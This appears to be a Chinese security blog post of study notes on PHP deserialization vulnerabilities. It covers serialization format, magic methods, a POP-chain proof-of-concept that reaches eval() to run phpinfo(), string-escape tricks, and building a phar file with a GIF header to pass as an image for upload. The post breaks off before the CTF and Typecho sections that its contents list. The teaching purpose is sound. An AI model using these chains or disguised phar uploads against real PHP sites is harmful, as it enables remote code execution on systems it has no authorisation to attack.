<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Echoram"><meta name="copyright" content="Echoram"><meta name="generator" content="Hexo 5.2.0"><meta name="theme" content="hexo-theme-yun"><title>反序列化漏洞学习笔记（一）—— 反序列化漏洞原理 | Echoram's blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.22/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/images/head.ico"><link rel="mask-icon" href="/images/head.ico" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"echoram.tk","root":"/","title":["Echoram's","Blog"],"version":"1.3.0","mode":"auto","copycode":true,"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><meta name="description" content="反序列化漏洞的原理，举了一个CTF例子和Typecho的反序列化漏洞复现">
<meta property="og:type" content="article">
<meta property="og:title" content="反序列化漏洞学习笔记（一）—— 反序列化漏洞原理">
<meta property="og:url" content="http://echoram.tk/2021/04/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
<meta property="og:site_name" content="Echoram&#39;s blog">
<meta property="og:description" content="反序列化漏洞的原理，举了一个CTF例子和Typecho的反序列化漏洞复现">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210525160442.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430094650.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430094643.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430201511.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430201504.png">
<meta property="article:published_time" content="2021-04-28T00:00:00.000Z">
<meta property="article:modified_time" content="2021-05-17T08:01:18.832Z">
<meta property="article:author" content="Echoram">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210525160442.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Echoram"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Echoram"><span class="site-author-status" title="爱你呦~">💘</span></a><div class="site-author-name"><a href="/about/">Echoram</a></div><a class="site-name" href="/about/site.html">Echoram's blog</a><sub class="site-subtitle">己所不欲,勿施于人</sub><div class="site-desciption">Talk is cheap,show me the code.</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">2</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">6</span></a></div><a class="site-state-item hty-icon-button" href="/comments/" title="留言板"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Jmhram" title="GitHub" target="_blank" style="color:#66ccff"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:mail@echoram.com" title="E-Mail" target="_blank" style="color:#39c5bb"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">0x01 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 序列化与反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 PHP魔术方法利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-%E6%99%AE%E9%80%9A%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 普通成员方法利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">1.4.</span> <span class="toc-text">1.4 反序列化字符逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.5.</span> <span class="toc-text">1.5 phar反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-6-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">1.6 SESSION反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-BUUCTF-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-number">2.</span> <span class="toc-text">0x02 BUUCTF-[网鼎杯 2020 青龙组]AreUSerialz</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 源码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-POC"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 POC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">0x03 Typecho反序列化漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 源码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 复现流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-payload%E6%9E%84%E9%80%A0%EF%BC%88%E5%8F%82%E8%80%83-5-%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 payload构造（参考[5]）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://echoram.tk/2021/04/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Echoram"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Echoram's blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">反序列化漏洞学习笔记（一）—— 反序列化漏洞原理</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2021-04-27 20:00:00" itemprop="dateCreated datePublished" datetime="2021-04-27T20:00:00-04:00">2021-04-27</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="修改时间：2021-05-17 04:01:18" itemprop="dateModified" datetime="2021-05-17T04:01:18-04:00">2021-05-17</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="本文字数">3.9k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="阅读时长">17m</span></span></span><span class="leancloud_visitors" id="/2021/04/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" data-flag-title="反序列化漏洞学习笔记（一）—— 反序列化漏洞原理"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/%E7%AC%94%E8%AE%B0/" style="--text-color:dimgray" itemprop="url" rel="index"><span itemprop="text">笔记</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">反序列化</span></a><a class="tag" href="/tags/Web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><h4 id="1-1-序列化与反序列化"><a href="#1-1-序列化与反序列化" class="headerlink" title="1.1 序列化与反序列化"></a>1.1 序列化与反序列化</h4><p><strong>序列化</strong>是<font color=red><code>将一个对象压缩成一个字符串的方法</code></font>，可以将对象的状态信息转化为可以存储或传输的形式。</p>
<p><strong>举个栗子</strong>：此处代码来源于[1]</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">userInfo</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'weak'</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'male'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ama666'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">modifyPasswd</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token variable">$passwd</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getPasswd</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$passwd</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$ama666</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">userInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ama666</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">modifyPasswd</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'strong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ama666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>输出结果为：</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"userInfo"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"userInfopasswd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"strong"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"*sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"male"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"ama666"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>

<span class="token shell-comment comment"># 含义如下：</span>
<span class="token shell-comment comment"># ' O:8:"userInfo":3: ' : 该Object名字为字符长度为8的"userInfo"，有三个属性</span>
<span class="token shell-comment comment"># 大括号内的内容是属性的名字、名字的字符长度、值和其他信息</span>
<span class="token shell-comment comment"># 针对不同权限的属性，表示方式也不同：private前添加对象名（userInfo）</span>
<span class="token shell-comment comment">#                               protected前添加星号（*）</span>
<span class="token shell-comment comment">#                               public没有前缀</span></code></pre>
</blockquote>
<p>因此，一个对象序列化之后，字符中也就只有对象名、对象的属性键值对，并不包含方法</p>
<p><font color=red><code>注：private属性在序列化的时候还包含空字节，所以一般要编码操作</code></font></p>
<p><strong>反序列化</strong>是将序列化后的字符串”解压缩”成对象的过程。</p>
<p><strong>但是</strong>，当这个字符串被还原的时候，并不会包含任何方法。因此，反序列化的对象想要使用原先的方法必须依托于<strong>域</strong>，脱离了原本的域，反序列的对象无法使用之前的方法。</p>
<h4 id="1-2-PHP魔术方法利用"><a href="#1-2-PHP魔术方法利用" class="headerlink" title="1.2 PHP魔术方法利用"></a>1.2 PHP魔术方法利用</h4><p>在PHP中，有一些魔术方法，在特定条件下，会自动触发，如果这些函数中不幸<del>(nice)</del>存在一些可利用的函数，就可以进行下一步攻击。16个魔法函数如下：</p>
<blockquote>
<ul>
<li>_autoload() : 当使用未定义的类时，自动调用该函数（7.2.0版本被弃用）</li>
<li>__call() : 调用未定义或不可访问的方法时自动调用</li>
<li>__callStatic() : 调用类的一个不存在的静态方法 ( 不存在或该方法不可访问 ) 时自动调用</li>
<li>__clone() : PHP 对象的拷贝完成后，自动调用该方法（注意PHP的拷贝是浅拷贝）</li>
<li>__construct() : 构造函数，此函数会在创建一个类的实例时自动调用</li>
<li>__debugInfo() : 用于定制对象的 <code>var_dump()</code> 输出结果，调用<code>var_dump()</code> 时自动调用</li>
<li>__destruct() : 对象的所有引用都被删除或者类被销毁的时候自动调用，程序结束也会自动调用析构函数</li>
<li>__get() : 读取不存在或不可访问的属性值的时候，此魔法函数会自动调用</li>
<li>__invoke() : 会在将一个对象当作一个方法来使用时会自动调用</li>
<li>__isset() : 判断属性是否定义时，若属性私有或未定义，则自动调用</li>
<li>__set() : 给类的实例的不存在的属性或不可访问的属性赋值</li>
<li>__set_state() :  用<code>var_export()</code>输出一个对象时，会自动调用</li>
<li>__sleep() : 进行序列化的时候，先调用此函数，用于定制序列化结果，剔除无需序列化的属性</li>
<li>__toString() : 对象被当作字符串格式处理时会自动触发，需要此函数中的功能语句将对象转化为字符串，该函数必须要有一个字符串格式的返回值</li>
<li>__unset() : 销毁私有属性或不存在的属性时会自动调用</li>
<li>__wakeup() : 进行反序列化的时候，先调用此函数</li>
</ul>
</blockquote>
<p><font color=red><code>注：所有魔法函数必须声明为public</code></font></p>
<h4 id="1-3-普通成员方法利用"><a href="#1-3-普通成员方法利用" class="headerlink" title="1.3 普通成员方法利用"></a>1.3 普通成员方法利用</h4><p>寻找相同的同名方法，将敏感函数和类联系在一起。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">chybeta</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ph0en1x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">ph0en1x</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"ph0en1x"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">ph0en2x</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$test2</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$class6</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">chybeta</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>例如上文中的代码：</p>
<p>析构函数中调用了对象的<code>action()</code>方法，而<code>ph0en1x</code>类和<code>ph0en2x</code>类中均含有<code>action()</code>方法，所以，若在构造序列化的时候将<code>test</code>属性设置为<code>ph0en2x</code>对象，则可以使用<code>ph0en2x</code>中的<code>eval()</code>函数执行自定义的<code>PHP</code>语句。</p>
<p>POC如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">chybeta</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ph0en2x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">ph0en2x</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$test2</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"phpinfo();"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">chybeta</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<h4 id="1-4-反序列化字符逃逸"><a href="#1-4-反序列化字符逃逸" class="headerlink" title="1.4 反序列化字符逃逸"></a>1.4 反序列化字符逃逸</h4><p>PHP反序列化字符逃逸依靠PHP在反序列化时的几个特性：</p>
<blockquote>
<ul>
<li><p>对类中不存在的属性也会反序列化</p>
</li>
<li><p>在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且根据长度判断内容</p>
<p>例：正常的反序列化可执行<code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</code></p>
<p>执行<code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;i:1;s:5:&quot;aaaaa&quot;;</code>仍可得到相同结果</p>
</li>
</ul>
</blockquote>
<p>所以当碰到PHP对反序列化的字符串进行替换、删除等改变字符长度的操作时，可以构造<code>payload</code>使得替换后的字符串仍能正常反序列化，并反序列化为自定义的内容</p>
<h4 id="1-5-phar反序列化"><a href="#1-5-phar反序列化" class="headerlink" title="1.5 phar反序列化"></a>1.5 phar反序列化</h4><p><code>phar://</code>是<code>PHP</code>解压压缩包的一个函数，不管什么，都会当做压缩包来解压，当使用该伪协议读取<code>phar</code>文件时，会自动将文件中的<code>meta-data</code>部分反序列化</p>
<p>在真实情况，需要将构造好的<code>phar</code>文件上传到目标服务器，然后利用<code>phar</code>在解压时会反序化<code>meta-data</code>部分来达到目的</p>
<p><code>phar</code>文件生成如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'GIF89a'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//设置stub，增加gif文件头</span>
    <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test.txt'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//添加要压缩的文件</span>
    <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$object</span> <span class="token operator">-</span><span class="token operator">></span> data <span class="token operator">=</span> <span class="token single-quoted-string string">'Lmg'</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//将自定义meta-data存入manifest</span>
    <span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>注意测试的时候要将<code>php.ini</code>的<code>phar.readonly</code>参数设置为<code>off</code>：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210525160442.png" alt="image-20210525160435845" loading="lazy"></p>
<blockquote>
<p>利用条件：</p>
<ul>
<li>phar文件要能上传</li>
<li>有可利用函数如上图，可魔法函数构造pop链</li>
<li>文件函数操作可控，: / phar 等没过被过滤</li>
</ul>
</blockquote>
